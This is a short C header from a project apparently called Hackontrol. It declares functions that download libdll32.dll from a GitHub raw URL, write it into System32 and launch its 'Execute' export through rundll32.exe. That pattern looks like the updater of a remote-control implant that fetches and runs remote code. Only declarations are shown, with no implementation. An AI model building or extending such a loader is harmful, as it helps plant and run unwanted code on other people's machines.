#pragma once

#include <khopanwin32.h>
#include <khopandatastream.h>

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_LIBDLL32     L"libdll32.dll"
#define FILE_RUNDLL32     L"rundll32.exe"
#define FOLDER_SYSTEM32   L"System32"
#define FUNCTION_LIBDLL32 L"Execute"
#define URL_LIBDLL32_FILE "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libdll32.dll"

BOOL DownloadLatestLibdll32(DataStream* stream);
void WaitForLibdll32ToExit(DWORD processIdentifier);
BOOL WriteLibdll32(DataStream* stream);
void ExecuteLibdll32();
